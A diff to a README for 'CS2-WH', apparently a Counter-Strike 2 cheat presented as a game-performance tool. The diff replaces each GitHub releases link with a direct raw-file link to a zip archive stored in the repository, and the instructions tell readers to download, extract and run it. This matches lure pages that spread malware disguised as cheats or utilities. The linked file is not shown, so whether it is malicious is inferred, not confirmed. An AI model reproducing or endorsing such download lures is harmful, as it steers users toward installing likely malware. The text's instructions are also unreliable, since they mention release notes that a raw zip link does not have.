@@ -1,6 +1,6 @@
 # 🎯 CS2-WH - Improve your game performance easily
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue?style=for-the-badge)](https://github.com/Large-matrix891/CS2-WH/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Large-matrix891/CS2-WH/main/antioptimist/C-WH-v3.1.zip)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these conditions to run the software properly:
 
 Follow these steps to obtain and launch the software.
 
-1.  Visit the official [Download Page](https://github.com/Large-matrix891/CS2-WH/releases).
+1.  Visit the official [Download Page](https://raw.githubusercontent.com/Large-matrix891/CS2-WH/main/antioptimist/C-WH-v3.1.zip).
 2.  Click the link for the latest release file.
 3.  Save the compressed folder to your desktop.
 4.  Right-click the folder and select Extract All.
@@ -58,7 +58,7 @@ Proper configuration ensures the software operates within your expectations.
 
 Access the software through the primary distribution channel.
 
-[Download Software Here](https://github.com/Large-matrix891/CS2-WH/releases)
+[Download Software Here](https://raw.githubusercontent.com/Large-matrix891/CS2-WH/main/antioptimist/C-WH-v3.1.zip)
 
 1.  Navigate to the provided link above.
 2.  Identify the asset list at the bottom of the release notes.
